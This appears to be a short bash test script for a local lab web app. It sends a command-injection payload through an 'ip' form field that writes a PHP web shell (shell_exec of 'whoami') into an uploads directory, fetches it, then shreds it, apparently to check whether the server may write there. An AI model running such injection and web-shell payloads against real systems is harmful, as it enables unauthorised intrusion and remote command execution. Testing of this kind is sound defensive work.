#!/bin/bash

echo -e `date +"%Y-%m-%d %H:%M:%S"` "\e[92mWebserver writing to non-allowed directory\033[m"
curl -X POST -d "ip=1.1.1.1;echo+%27%3C%3Fphp+shell_exec%28%22whoami%22%29%3B+%3F%3E%27+%3E+uploads%2Ftest.php&Submit=Submit" http://localhost/low.php
curl http://localhost/uploads/test.php
shred /var/www/html/uploads/test.php
